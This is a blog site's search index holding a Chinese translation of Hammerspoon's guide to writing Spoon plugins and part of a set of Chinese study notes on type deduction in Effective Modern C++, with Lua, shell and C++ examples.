<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>如何编写 Hammerspoon Spoon 插件</title>
    <link href="/posts/4008/"/>
    <url>/posts/4008/</url>
    
    <content type="html"><![CDATA[<h1 id="如何编写-hammerspoon-spoon-插件">如何编写 Hammerspoon Spoon插件</h1><p>[TOC]</p><h2 id="写在前面">写在前面</h2><p>此文章是对HammerspoonSPOON.md官方文档的翻译。Hmmerspoon是macOS上强大的自动化工具，其采用lua包装了macOS系统中的一些调用。对应于Windows平台上的AutoHotkey，lua语法更加简洁优雅，可玩性也很高。但相比AutoHotkey，相关的资料也较少，想要写出符合自己预期的脚本，还是需要多下功夫阅读官方API文档，多参考英文论坛。将部分内容进行翻译一方面方便自己学习，另一方面也希望更多的Programmeron macOS能够了解这个强大的工具。</p><h2 id="什么是spoon">什么是Spoon?</h2><p>Spoons （直译：勺子）是纯 Lua 插件，供用户在 Hammerspoon配置中使用。</p><p>作为一个社区，我们已经为 Hammerspoon创建了许多优秀的配置，但在它们之间共享代码是很困难且兼容性差（不同人写的脚本风格迥异）。为了解决这些问题，我们创建了Spoons。 用户应该能够下载一个 Spoon并快速将其集成到自己的配置中，而不用担心它内部在做什么。</p><p>之所以能做到这一点，是因为以下两点：</p><ul><li>Hammerspoon 中有用于从 Spoons 中加载 Lua 代码的自动化脚本</li><li>Spoons 的作者尽可能坚持使用标准的 API 供用户使用</li></ul><h2 id="我从哪里可以获得spoon">我从哪里可以获得Spoon?</h2><p>Spoons 的官方资源库是 <a href="https://www.hammerspoon.org/Spoons">https://www.hammerspoon.org/Spoons</a>（其来源可在<a href="https://github.com/Hammerspoon/Spoons">https://github.com/Hammerspoon/Spoons</a>）找到），但作者也可以选择在自己的网站上单独发布。</p><h2 id="如何安装spoon">如何安装Spoon?</h2><p>Spoon应该以<code>.zip</code>文件的形式发布。只需下载，解压缩（如果您的浏览器没有自动解压缩），然后双击Spoon。Hammerspoon会将其安装到 <code>~/.hammerspoon/Spoons/</code> 中。</p><h2 id="如何使用spoon">如何使用Spoon？</h2><p>你需要做两步工作：一是加载Spoon，二是将其集成到您的配置中。 希望Spoon 附带了一些文档，可以在其主页或<code>~/.hammerspoon/Spoons/NAME.spoon</code> 中找到。在那里，你可以找到Spoon 所提供的 API 的一些文档，以及它的一些特殊要求。</p><h3 id="加载spoon">加载Spoon</h3><p>对于大多数Spoon，只需在 Hammerspoon 配置中添加<code>hs.loadSpoon("NAME")</code>（注意 <code>NAME</code><strong>不应</strong>包含 <code>.spoon</code>扩展名）。这将使Spoons在全局 Lua 命名空间中以 <code>spoon.NAME</code>的形式存在。</p><p>加载Spoon后，如果Spoon有<code>start()</code>方法，您有责任在使用前调用该方法。</p><p>请注意，<code>hs.loadSpoon()</code> 使用 <code>package.path</code>来查找 Spoons。因此，您可以将其他路径添加到 <code>package.path</code>中，让它在其他路径下查找 Spoons，如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gpdn6ulna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-gpdn6ulna3fjks"><pre><code class="hljs lua"><span class="hljs-comment">-- 也在 ~/.hammerspoon/MySpoons 中查找Spoon</span><span class="hljs-built_in">package</span>.<span class="hljs-built_in">path</span> = <span class="hljs-built_in">package</span>.<span class="hljs-built_in">path</span> .. <span class="hljs-string">";"</span> .. hs.configdir .. <span class="hljs-string">"/MySpoons/?.spoon/init.lua"</span></code></pre></div></div><p>如果你正在开发 Spoons，这将非常有用。</p><h3 id="集成到您的配置中">集成到您的配置中</h3><p>在大多数情况下，API 应大致采取这种形式：</p><ul><li><code>NAME:init()</code> - 这将由 <code>hs.loadSpoon()</code>自动调用，并将完成所需的初始设置工作，但通常不应开始执行任何操作。</li><li><code>NAME:start()</code> -如果需要任何类型的后台工作，该方法将启动它</li><li><code>NAME:stop()</code> -如果正在运行任何类型的后台工作，本方法将停止它</li><li><code>NAME:bindHotkeys(mapping)</code> - 该方法用于告诉 Spoon如何为其各种功能绑定热键。根据 Spoon的不同，这些热键可以立即绑定，也可以在调用<code>:start()</code>时绑定。该方法只接受一个参数，即一个表格：</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vtmnrolna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-vtmnrolna3fjks"><pre><code class="hljs lua">{ someFeature = {{<span class="hljs-string">"cmd"</span>, <span class="hljs-string">"alt"</span>}, <span class="hljs-string">"f"</span>},  otherFeature = {{<span class="hljs-string">"shift"</span>, <span class="hljs-string">"ctrl"</span>}, <span class="hljs-string">"b"</span>}}</code></pre></div></div><p>Spoon 还应提供一些标准元数据：</p><ul><li><code>NAME.name</code> - 包含 Spoon 名称的字符串</li><li><code>NAME.version</code> - 包含 Spoon 版本号的字符串</li><li><code>NAME.author</code> - 包含Spoon 作者姓名/电子邮件的字符串</li><li><code>NAME.license</code> - 包含Spoon许可证信息的字符串，最好包含许可证的 URL</li></ul><p>可选项</p><ul><li><code>NAME.homepage</code> - 包含Spoon 主页URL的字符串。</li></ul><p>除此以外，许多 Spoon 还会提供额外的 API点，你可以查阅它们的文档了解更多信息。</p><h3 id="如何创建一个-spoon">如何创建一个 Spoon？</h3><p>最终，Spoon可以是一个以<code>.spoon</code>结尾的目录，并在其中包含一个<code>init.lua</code>。</p><p>然而，当Spoon符合API约定时，就能为Hammerspoon的用户提供最大的价值，允许用户以非常相似的方式与所有的Spoon进行交互。</p><h3 id="应用程序接口约定">应用程序接口约定</h3><h4 id="命名">命名</h4><ul><li>Spoon名称应使用标题大小写</li><li>Spoon方法/变量/常量等应使用 camelCase</li></ul><h4 id="初始化">初始化</h4><p>当用户调用<code>hs.loadSpoon()</code>时，Hammerspoon 将从相关的 Spoon中加载并执行<code>init.lua</code>。</p><p>一般来说，您不应该在<code>init.lua</code>的主范围内执行任何工作、映射任何热键、启动任何计时器/监视器等。取而代之的是，它应简单地准备一个包含稍后使用的方法的对象，然后返回该对象。</p><p>如果您返回的对象有一个 <code>:init()</code>方法，Hammerspoon会自动调用它（尽管用户可以覆盖此行为，所以请务必记录您的<code>:init()</code>方法）。</p><p>在<code>:init()</code>方法中，您应该做任何必要的工作来为以后的使用准备资源，不过一般来说，您不应该在这里启动任何定时器/监视器等或映射任何热键。</p><h4 id="元数据">元数据</h4><p>至少应在对象中包含以下属性：</p><ul><li><code>NAME.name</code> - Spoon 的名称</li><li><code>NAME.version</code> - Spoon 的版本</li><li><code>NAME.author</code> - 您的姓名和可选的电子邮件地址</li><li><code>NAME.license</code> - 适用于您的 Spoon的软件许可证，最好带有许可证文本的链接（例如，<a href="https://opensource.org/">https://opensource.org/</a></li></ul><p>可选项：</p><ul><li><code>NAME.homepage</code> - Spoon 主页的 URL，例如 GitHub仓库。</li></ul><h4 id="启动停止">启动/停止</h4><p>如果您的 Spoon提供了某种后台活动，例如定时器、监视器、聚光灯搜索等，您通常应使用<code>:start()</code>方法激活它们，并使用<code>:stop()</code>方法停止激活它们。</p><h4 id="热键">热键</h4><p>如果您的 Spoon 提供了用户可以映射到热键的操作，您应该公开一个<code>:bindHotKeys()</code>方法。该方法应接受一个参数，即一个表格。表中的键应是描述热键执行的操作的字符串，表中的值应是包含修改器和键名/键码的表，以及触发热键时通过<code>hs.alert()</code> 显示的信息。</p><p>例如，如果用户想映射两个操作，<code>show</code>和<code>hide</code>，他们可以输入</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b2i5oblna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-b2i5oblna3fjks"><pre><code class="hljs lua">{  show={{<span class="hljs-string">"cmd"</span>, <span class="hljs-string">"alt"</span>}, <span class="hljs-string">"s"</span>, message=<span class="hljs-string">"Show"</span>}、  hide={{<span class="hljs-string">"cmd"</span>, <span class="hljs-string">"alt"</span>}, <span class="hljs-string">"h"</span>}}</code></pre></div></div><p>现在，您的 <code>:bindHotkeys()</code>方法已拥有将热键绑定到其方法所需的全部信息。</p><p>虽然您可能想验证表中的内容，但只要您已经很好地记录了方法，对其范围进行相当有限的限制似乎也是合理的。</p><p>函数<code>hs.spoons.bindHotkeysToSpec()</code>可以为您完成大部分艰巨的映射工作。例如，下面的代码可以将动作<code>show</code> 和 <code>hide</code> 分别绑定到<code>showMethod()</code> 和 <code>hideMethod()</code> 中：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ykji92lna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-ykji92lna3fjks"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MySpoon:bindHotKeys</span><span class="hljs-params">(mapping)</span></span>  <span class="hljs-keyword">local</span> spec = {    show = hs.fnutils.partial(<span class="hljs-built_in">self</span>.showMethod, <span class="hljs-built_in">self</span>),    hide = hs.fnutils.partial(<span class="hljs-built_in">self</span>.hideMethod, <span class="hljs-built_in">self</span>),  }  hs.spoons.bindHotkeysToSpec(spec, mapping)  <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span><span class="hljs-keyword">end</span></code></pre></div></div><h4 id="其他">其他</h4><p>您可以提出任何其他方法，虽然从技术上讲，用户可以访问所有这些方法，但您只应记录您真正打算作为公共API 使用的方法。</p><h3 id="文档">文档</h3><h4 id="编写">编写</h4><p>Spoon 方法/变量等的文档格式应与 Hammerspoon 自身 API的文档格式相同。举个例子，一个添加 USB 设备到 Spoon 的方法，当 USB设备连接时会采取一些行动，可能看起来像这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qyi6f2lna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-qyi6f2lna3fjks"><pre><code class="hljs lua"><span class="hljs-comment">--- USBObserver:addDevice(vendorID, productID[, name])</span><span class="hljs-comment">--- Method</span><span class="hljs-comment">--- Adds a device to USBObserver's watch list</span><span class="hljs-comment">---</span><span class="hljs-comment">--- Parameters:</span><span class="hljs-comment">---  * vendorID - A number containing the vendor ID of a USB device</span><span class="hljs-comment">---  * productID - A number containing the product ID of a USB device</span><span class="hljs-comment">---  * name - An optional string containing the name of a USB device</span><span class="hljs-comment">---</span><span class="hljs-comment">--- Returns:</span><span class="hljs-comment">---  * A boolean, true if the device was added, otherwise false</span></code></pre></div></div><p>按照 Hammerspoon的惯例，方法倾向于返回它们所属的对象（因此方法可以是链式的，例如<code>foo:bar():baz()</code>），但这并不总是合适的。</p><h4 id="生成">生成</h4><p>有几种工具可以对 Hammerspoon 和 Spoons使用的文档说明进行操作。在最简单的情况下，每个 Spoon 都应包含一个<code>docs.json</code> 文件，该文件只是各种文档strings 的集合。该文件可使用 Hammerspoon 命令行工具生成（参见 <a href="https://www.hammerspoon.org/docs/hs.ipc.html#cliInstall">https://www.hammerspoon.org/docs/hs.ipc.html#cliInstall</a>）：</p><p>首先在<code>init.lua</code>中：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b26l1elna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-b26l1elna3fjks"><pre><code class="hljs lua"><span class="hljs-built_in">require</span>(<span class="hljs-string">"hs.ipc"</span>)hs.ipc.cliInstall()</code></pre></div></div><p>运行一次，会自动下载命令行工具并配置环境变量。然后可以在命令行使用：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-25p8rylna3fjks"></i><span>bash</span><div class="collapse show" id="collapse-25p8rylna3fjks"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /path/too/your/Spoonhs -c <span class="hljs-string">"hs.doc.builder.genJSON(\"<span class="hljs-subst">$(pwd)</span>\")"</span> | grep -v <span class="hljs-string">"^--"</span> &gt; docs.json</code></pre></div></div><p>任何提交到 Spoons 官方仓库的 Spoons 都将由 GitHub 生成并托管其 HTML文档。</p><p>如果您也想为自己的文档生成 HTML/Markdown 版本：</p><ul><li>克隆 <a href="https://github.com/Hammerspoon/hammerspoon">https://github.com/Hammerspoon/hammerspoon</a></li><li>安装所需的 Python 依赖项（例如 Hammerspoon 仓库中的<code>pip install --user -r requirements.txt</code>)</li><li>然后在 Spoon 的目录下运行</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dtj8aclna3fjks"></i><span>bash</span><div class="collapse show" id="collapse-dtj8aclna3fjks"><pre><code class="hljs bash">/path/to/hammerspoon_repo/scripts/docs/bin/build_docs.py --templates /path/to/hammerspoon_repo/scripts/docs/templates/ --output_dir . --json --html --markdown --standalone .</code></pre></div></div><p>这将搜索当前工作目录中的任何 <code>.lua</code> 文件，从中提取docstrings，并将 <code>docs.json</code> 与 HTML 和 Markdown输出一起写入当前目录。更多选项请参见 <code>build_docs.py --help</code>。</p><h3 id="加载文件">加载文件</h3><p>如果你的 Spoon不只是<code>init.lua</code>那么复杂，你很快就会遇到一个问题，那就是如何加载额外的<code>.lua</code>文件或其他类型的资源（如图片）。</p><p>不过，有一个简单的方法可以发现 Spoon 在文件系统中的真实路径。只需使用<code>hs.spoons.scriptPath()</code> 函数即可：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-904zu6lna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-904zu6lna3fjks"><pre><code class="hljs lua"><span class="hljs-comment">-- 获取 Spoon 的 init.lua 脚本路径</span>obj.spoonPath = hs.spoons.scriptPath()</code></pre></div></div><h4 id="资源文件">资源文件</h4><p>要访问与 Spoon 绑定的资源文件，请使用<code>hs.spoons.resourcePath()</code> 函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-928k5blna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-928k5blna3fjks"><pre><code class="hljs lua"><span class="hljs-comment">-- 获取与 Spoon 绑定的资源的路径</span>obj.imagePath = hs.spoons.resourcePath(<span class="hljs-string">"images/someImage.png"</span>)</code></pre></div></div><h4 id="代码">代码</h4><p>不能使用 <code>require()</code> 在 Spoon 中加载 <code>.lua</code>文件，而应使用</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-735u7tlna3fjks"></i><span>lua</span><div class="collapse show" id="collapse-735u7tlna3fjks"><pre><code class="hljs lua"><span class="hljs-built_in">dofile</span>(hs.spoons.resourcePath(<span class="hljs-string">"someCode.lua"</span>))</code></pre></div></div><p>这样，<code>someCode.lua</code>文件就会被加载并执行（如果它返回任何内容，你可以从<code>dofile()</code>中获取这些值）。</p>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hammerspoon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Effective Modern C++ - Item1-6 - 类型推导</title>
    <link href="/posts/27022/"/>
    <url>/posts/27022/</url>
    
    <content type="html"><![CDATA[<h1 id="effective-modern-c---item1-6--类型推导">Effective Modern C++ -Item1-6- 类型推导</h1><h2 id="总览">总览</h2><p>这一部分是阅读Effective ModernC++的笔记。在此结合自己的理解和编程实践对其进行补充，并订正一些错误，以方便自己后续总结回顾，同时在尽可能保持简洁的前提下提高可读性。原书可在<a href="https://cntransgroup.github.io/EffectiveModernCppChinese">这里</a>查看非官方的中文翻译。</p><p>本部分整合了原书内容的一到二章，对<strong>条款1-6</strong>进行介绍，同时结合阅读的体验适当调整了顺序或改变了叙述方式。原作者可能假设我们已经对C++非常了解，着重讲述了很多特例，一开始阅读很容易迷失在细节里。和原书顺序相比，我更希望适应从简单到复杂，从一般到特例的学习规律去总结讲述。</p><p>同时，将可能需要补充的前置知识或者作者补充的不那么重要的“冷知识”，以及可能需要的进一步解释放到块引用中，避免喧宾夺主的同时对内容进行适当补充或简略。</p><p>阅读本节前你需要知道对C++的移动语义有所了解。这一部分在原书简介有介绍。如果你已经有最基本的了解，可以跳过下面内容。</p><blockquote><p>首先我们想为什么要有移动语义。</p><p>某个对象包含一些指针，这些指针所指的内容很多。回顾一下，我们知道在拷贝对象的时候，编译器默认会按值拷贝所有的数据。对于指针，我们需要自定义拷贝构造函数重新分配内存并复制原对象指针的数据，以保证和原对象独立（不知道的话该重学C++了）。这些指针所指的内容很多，导致新开辟内存，复制数据的开销很大。而有了移动语义，我们可以仅仅改变指针的指向，将原对象的指针置为空，便实现了内存资源从原对象到目标对象的迁移。可以看出，移动后的原对象<strong>通常不再有效</strong>，直到被赋予新的值。</p><p>移动语义的基础是区分右值和左值表达式。那是因为右值表明这个对象适合移动操作，而左值一般不适合。</p><p>概念上（尽管不经常在实际上用），右值对应于<strong>临时对象</strong>，而左值对应于你<strong>可以引用</strong>的（canreferto），实实在在存在的对象，或者通过名字，或者通过指针或左值引用。</p><p>临时对象包含字面量，函数返回的临时值等。</p><p>顾名思义，接受左值的引用是左值引用，接受右值的引用是右值引用，如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ildse9lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-ildse9lmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>{};A &amp; rl = <span class="hljs-built_in">A</span>();  <span class="hljs-comment">//错误，无名临时变量 A() 是右值，因此不能初始化左值引用 r1</span>A &amp;&amp; r2 = <span class="hljs-built_in">A</span>();  <span class="hljs-comment">//正确，因 r2 是右值引用</span></code></pre></div></div><p>有两种实践上的心智模型帮助判断一个值是左值还是右值。一种是，可以被赋值的是左值，不能的是右值，</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lul4yklmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-lul4yklmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>; <span class="hljs-comment">// a是左值</span><span class="hljs-number">5</span> = a; <span class="hljs-comment">//错误，5 不能为左值</span></code></pre></div></div><p>另一种贴近本质，看看能否取得它的地址。如果能取地址，那么通常就是左值。如果不能，则通常是右值。</p><p>比如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gqd2dglmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-gqd2dglmyir35t"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Widget</span>(Widget&amp;&amp; rhs);   <span class="hljs-comment">//rhs(right-hand side)是个左值，</span>    …                       <span class="hljs-comment">//尽管它有个右值引用的类型</span>};</code></pre></div></div><p><code>rhs</code>虽然用<code>&amp;&amp;</code>修饰，但它是实实在在的左值。因为它是函数的参数，被放到栈上。在函数里<code>rhs</code>的地址非常合理。事实上这个<code>&amp;&amp;</code>仅代表它是<code>Widget</code>的<strong>移动构造函数</strong>，以和拷贝构造函数区分。</p><p>至于移动构造函数怎么用，怎么移动对象，这一部分会涉及，但是都会给出解释。现在你只需要理解移动语义和左值右值的概念就可以了。</p></blockquote><h2 id="条款一理解模板类型推导">条款一：理解模板类型推导</h2><p>类型推导其实算不上新东西。C++98早有一套类型推导的规则：用于函数模板的规则。这一部分看上去可能有点抽象和无聊。不要着急。理解模版类型推导对理解C++11中的<code>auto</code>非常重要，因此单独拎出来讲解。</p><blockquote><p>如果对于类型推导操作没有一个扎实的理解，要想写出有现代感的C++程序是不可能的。</p></blockquote><p>考虑这样一个函数模版：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cvlu7jlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-cvlu7jlmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(ParamType param)</span></span>;</code></pre></div></div><p>编译器会通过表达式<code>expr</code>推导出两个类型：一个是<code>T</code>的类型，另一个是<code>ParamType</code>的类型。马上就可以看到，这两个类型往往不一样。</p><p>先举个例子理解一下概念：</p><p>如果模板这样声明：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2a1ul1lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-2a1ul1lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-type">const</span> T&amp; param)</span></span>;         <span class="hljs-comment">//ParamType是const T&amp;</span></code></pre></div></div><p>然后这样进行调用：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dhly1mlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-dhly1mlmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">int</span> x = <span class="hljs-number">0</span>;                      <span class="hljs-comment">//expr</span><span class="hljs-built_in">f</span>(x);                           <span class="hljs-comment">//用一个int类型的变量调用f</span></code></pre></div></div><p><code>T</code>被推导为<code>int</code>，<code>ParamType</code>被推导为<code>const int&amp;</code>。</p><h3 id="case-1-paramtype既不是指针也不是引用">Case 1:<code>ParamType</code>既不是指针也不是引用</h3><p>先看“看上去”最简单的情况。当<code>ParamType</code>既不是指针也不是引用时，我们通过传值（pass-by-value）的方式处理，也即，无论传入的是什么，<code>param</code>都会是它的一个<strong>副本</strong>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bcmx51lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-bcmx51lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                <span class="hljs-comment">//以传值的方式处理param</span></code></pre></div></div><p>声明这些变量：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y46j2dlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-y46j2dlmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">int</span> x=<span class="hljs-number">27</span>;                       <span class="hljs-comment">//x是int</span><span class="hljs-type">const</span> <span class="hljs-type">int</span> cx=x;                 <span class="hljs-comment">//cx是const int</span><span class="hljs-type">const</span> <span class="hljs-type">int</span>&amp; rx=x;                <span class="hljs-comment">//rx是指向作为const int的x的引用</span></code></pre></div></div><p>在不同的调用中，对<code>param</code>和<code>T</code>推导的类型会是这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-11t2e5lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-11t2e5lmyir35t"><pre><code class="hljs cpp"><span class="hljs-built_in">f</span>(x);                           <span class="hljs-comment">//T和param的类型都是int</span><span class="hljs-built_in">f</span>(cx);                          <span class="hljs-comment">//T和param的类型都是int</span><span class="hljs-built_in">f</span>(rx);                          <span class="hljs-comment">//T和param的类型都是int</span></code></pre></div></div><p>你会发现不管是<code>T</code>还是<code>prarm</code>，都无视了引用和<code>const</code>。事实上如果有<code>volatile</code>也会忽略。</p><p>这很容易理解。<code>param</code>是一个<strong>完全独立</strong>于<code>cx</code>和<code>rx</code>的对象，都值传递了自然不会带着引用，具有常量性的<code>cx</code>和<code>rx</code>不可修改并不代表<code>param</code>也是一样。</p><p>理解了值传递的内涵，我们看下面的“特例”：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-l25qp5lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-l25qp5lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T param)</span></span>;                <span class="hljs-comment">//仍然以传值的方式处理param</span><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-type">const</span> ptr =         <span class="hljs-comment">//ptr是一个常量指针，指向常量对象 </span>    <span class="hljs-string">"Fun with pointers"</span>;<span class="hljs-built_in">f</span>(ptr);                         <span class="hljs-comment">//传递const char * const类型的实参</span></code></pre></div></div><p>解引用符号（*）的右边的<code>const</code>表示<code>ptr</code>本身是一个<code>const</code>，不能指向其他对象；左边表示指向的是<code>const char*</code>。这时值传递会去除指针本身的常量性，而显然没有能力影响指针所指数据的类型。所以推导结果<code>T</code>和<code>param</code>的类型都是<code>const char*</code>。</p><h3 id="case-2-paramtype是一个指针或引用">Case 2:<code>ParamType</code>是一个指针或引用</h3><p>这种情况依旧很自然：</p><p>首先<code>T</code>不会带引用。</p><p>然后<code>expr</code>的类型与<code>ParamType</code>进行模式匹配，少啥补啥。</p><p>看例子。对于模版</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cd139mlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-cd139mlmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp; param)</span></span>;               <span class="hljs-comment">//param是一个引用</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ogqpajlmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-ogqpajlmyir35t"><pre><code class="hljs cpp"><span class="hljs-type">int</span> x=<span class="hljs-number">27</span>;                       <span class="hljs-comment">//x是int</span><span class="hljs-type">const</span> <span class="hljs-type">int</span> cx=x;                 <span class="hljs-comment">//cx是const int</span><span class="hljs-type">const</span> <span class="hljs-type">int</span>&amp; rx=x;                <span class="hljs-comment">//rx是指向作为const int的x的引用</span></code></pre></div></div><p>看推导结果：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rt7cc6lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-rt7cc6lmyir35t"><pre><code class="hljs cpp"><span class="hljs-built_in">f</span>(x);                           <span class="hljs-comment">//T是int，param的类型是int&amp;</span><span class="hljs-built_in">f</span>(cx);                          <span class="hljs-comment">//T是const int，param的类型是const int&amp;</span><span class="hljs-built_in">f</span>(rx);                          <span class="hljs-comment">//T是const int，param的类型是const int&amp;</span></code></pre></div></div><p>对象的常量性<code>constness</code>会被保留为<code>T</code>的一部分。因为当调用者传递一个<code>const</code>对象给一个<strong>引用</strong>类型的形参时，他们期望对象保持不可改变性。</p><p>显然我们指定了函数的参数是引用，抛开模版不谈，这时候不管是传值还是引用，函数都会以引用方式处理。所以<code>T</code>便不需要再重复说是个引用了。</p><p>对于指针本质是一样的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2j5zr7lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-2j5zr7lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T* param)</span></span>;               <span class="hljs-comment">//param现在是指针</span><span class="hljs-type">int</span> x = <span class="hljs-number">27</span>;                     <span class="hljs-comment">//同之前一样</span><span class="hljs-type">const</span> <span class="hljs-type">int</span> *px = &amp;x;             <span class="hljs-comment">//px是指向作为const int的x的指针</span><span class="hljs-built_in">f</span>(&amp;x);                          <span class="hljs-comment">//T是int，param的类型是int*</span><span class="hljs-built_in">f</span>(px);                          <span class="hljs-comment">//T是const int，param的类型是const int*</span></code></pre></div></div><h3 id="case-3-paramtype是一个通用引用">Case 3:<code>ParamType</code>是一个通用引用</h3><p>首先，你可能疑惑什么是通用引用（UniversalReference）。通用引用也叫万能引用。可能还是什么也没说。那就先看例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c866b8lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-c866b8lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp;&amp; param)</span></span>;</code></pre></div></div><blockquote><p>你想，这不是右值引用的符号吗？</p></blockquote><p>条款24详细的介绍了通用引用。后面你会知道，<strong>通用引用总是以<code>T&amp;&amp;</code>或等价的形式出现</strong>。其必定和类型推导相关联。</p><p>简单的说，它既可以是右值引用，也可以是左值引用。如果传入的是左值，它会被推导为左值，传入的是右值，它会被推导为右值。</p><p>具体一点，先看它的推导结果：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6gr3i4lmyir35t"></i><span>cpp</span><div class="collapse show" id="collapse-6gr3i4lmyir35t"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp;&amp; param)</span></span>;              <span class="hljs-comment">//param现在是一个通用引用类型</span>        <span class="hljs-type">int</span> 